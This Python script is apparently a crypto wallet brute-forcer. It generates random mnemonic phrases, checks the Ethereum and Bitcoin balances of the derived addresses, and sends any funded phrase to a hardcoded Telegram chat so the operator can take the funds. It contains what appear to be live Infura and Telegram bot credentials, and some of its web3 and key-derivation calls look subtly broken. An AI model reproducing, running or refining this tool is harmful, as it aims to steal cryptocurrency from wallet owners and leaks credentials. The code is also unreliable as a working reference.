import concurrent.futures
import asyncio
from web3 import Web3
from mnemonic import Mnemonic
from bip44 import Wallet
import requests
from telebot.async_telebot import AsyncTeleBot
import threading
import time

# Configuration
ETHEREUM_INFURA_URL = "https://mainnet.infura.io/v3/75722298119549be9f2e368591eb0a7b"
TELEGRAM_BOT_TOKEN = "6600045884:AAHCVIaUjbi9a0GbiQpcOEJcpxK-g0iqQsU"
TELEGRAM_CHAT_ID = "737206288"
BTC_API_URL = "https://blockchain.info/q/addressbalance/"

web3 = Web3(Web3.HTTPProvider(ETHEREUM_INFURA_URL))
bot = AsyncTeleBot(TELEGRAM_BOT_TOKEN)
mnemo = Mnemonic("english")
generation_count_5min = 0
total_generation_count = 0
counter_lock = threading.Lock()  # Lock for thread-safe counter updates


def get_eth_address(mnemonic_phrase):
    wallet = Wallet(mnemonic_phrase)
    private_key = wallet.derive_private_key("m/44'/60'/0'/0/0")
    account = web3.eth.account.privateKeyToAccount(private_key)
    return account.address


def get_btc_address(mnemonic_phrase):
    wallet = Wallet(mnemonic_phrase)
    child_key = wallet.derive_private_key("m/44'/0'/0'/0/0")
    return child_key.public_key().to_address()


def check_eth_balance(address):
    balance = web3.eth.get_balance(address)
    return web3.from_wei(balance, 'ether')


def check_btc_balance(address):
    try:
        response = requests.get(f"{BTC_API_URL}{address}")
        if response.status_code == 200:
            balance_satoshis = int(response.text)
            return balance_satoshis / 1e8  # Convert from satoshis to BTC
    except requests.RequestException:
        return 0  # Return 0 if API call fails
    return 0


async def report_generation_count():
    global generation_count_5min, total_generation_count
    while True:
        with counter_lock:
            message = (
                f"Total generations in last 5 minutes: {generation_count_5min}\n"
                f"Total generations since start: {total_generation_count}"
            )
            generation_count_5min = 0  # Reset the 5-minute count
        
        await bot.send_message(TELEGRAM_CHAT_ID, message)
        await asyncio.sleep(300)  # Report every 5 minutes


async def send_wallet_info(mnemonic, eth_address, eth_balance, btc_address, btc_balance):
    message = (
        f"Mnemonic: {mnemonic}\n"
        f"Ethereum Address: {eth_address}\n"
        f"Ethereum Balance: {eth_balance} ETH\n"
        f"Bitcoin Address: {btc_address}\n"
        f"Bitcoin Balance: {btc_balance} BTC"
    )
    await bot.send_message(TELEGRAM_CHAT_ID, message)


def generate_and_check_wallet():
    global generation_count_5min, total_generation_count
    try:
        mnemonic_phrase = mnemo.generate(strength=128)
        
        # Get Ethereum and Bitcoin addresses
        eth_address = get_eth_address(mnemonic_phrase)
        btc_address = get_btc_address(mnemonic_phrase)
        
        # Check Ethereum and Bitcoin balances
        eth_balance = check_eth_balance(eth_address)
        btc_balance = check_btc_balance(btc_address)
        
        # Only send info if either balance is greater than threshold
        if eth_balance > 0.000000001 or btc_balance > 0.000000001:
            asyncio.run(send_wallet_info(mnemonic_phrase, eth_address, eth_balance, btc_address, btc_balance))
        
        # Update counts (thread-safe)
        with counter_lock:
            generation_count_5min += 1
            total_generation_count += 1

    except Exception as e:
        print(f"Error in wallet generation: {e}")


async def main():
    await bot.send_message(TELEGRAM_CHAT_ID, "Bot started with parallel wallet generation.")
    
    # Schedule the reporting task to run every 5 minutes
    asyncio.create_task(report_generation_count())
    
    # Set up parallel generation using ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        while True:
            # Run up to 4 parallel wallet generations
            futures = [executor.submit(generate_and_check_wallet) for _ in range(4)]
            concurrent.futures.wait(futures)
            
            # Short sleep to ensure other tasks can run
            await asyncio.sleep(0.1)


# Run the main function
asyncio.run(main())
